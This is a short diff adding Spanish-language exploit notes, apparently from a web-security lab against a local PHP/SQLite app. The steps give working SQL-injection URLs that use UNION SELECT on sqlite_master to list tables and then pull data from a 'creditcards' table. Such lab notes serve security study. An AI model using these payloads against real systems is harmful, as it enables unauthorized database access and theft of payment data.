@@ -1,0 +1,10 @@
+Exploit
+
+1: Sacamos el error para ver el SQLite error y tal
+2. Probamos de hacer el union con sqlite_master: http://localhost/web/edit_player.php?id=7%20union%20select%20name,%20sql%20from%20sqlite_master 
+  Esta query nos saca la info de las tablas
+3. Iteramos el union hasta sacar las tablas que queramos y la info que deseemos de estas: http://localhost/web/edit_player.php?id=7%20union%20select%20name,%20sql%20from%20sqlite_master%20where%20name%3C%3E%22comments%22
+   Vamos haciendo iteraciones con where name <> 'nombre tabla'
+4. Intentamos sacar info jugosa: http://localhost/web/edit_player.php?id=7%20union%20select%20name,%20sql%20from%20sqlite_master%20where%20name%20=%20%22creditcards%22
+
+En los where de la URL recuerda meter ": where name = "creditcard"
